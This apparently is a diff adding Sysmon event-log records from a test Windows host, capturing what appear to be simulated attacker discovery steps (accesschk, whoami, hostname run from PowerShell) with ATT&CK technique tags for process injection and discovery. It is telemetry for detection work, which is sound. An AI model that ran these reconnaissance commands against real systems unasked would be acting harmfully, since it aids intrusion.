+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:12.553
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:12.537
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5700-656d-d302-000000001000}
+TargetProcessId: 4840
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1083,technique_name=File and Directory Discovery
+UtcTime: 2023-12-04 04:35:12.537
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {Set-Location -path \""""C:temp\..\ExternalPayloads\Sysinternals\"""";
+./accesschk.exe -accepteula .;}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:12.537
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:12.318
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5700-656d-d202-000000001000}
+TargetProcessId: 4568
+TargetImage: C:\Windows\system32\whoami.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96BE308D4)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1033,technique_name=System Owner/User Discovery
+UtcTime: 2023-12-04 04:35:12.329
+ProcessGuid: {1ac2ee8c-5700-656d-d202-000000001000}
+ProcessId: 4568
+Image: C:\Windows\System32\whoami.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: whoami - displays logged on user information
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: whoami.exe
+CommandLine: ""C:\Windows\system32\whoami.exe""
+CurrentDirectory: C:\Users\Test\Desktop\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=1915FBFDB73FDD200C47880247ACDDE5442431A9,MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:12.303
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5700-656d-d102-000000001000}
+TargetProcessId: 4444
+TargetImage: C:\Windows\system32\HOSTNAME.EXE
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96BE308D4)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
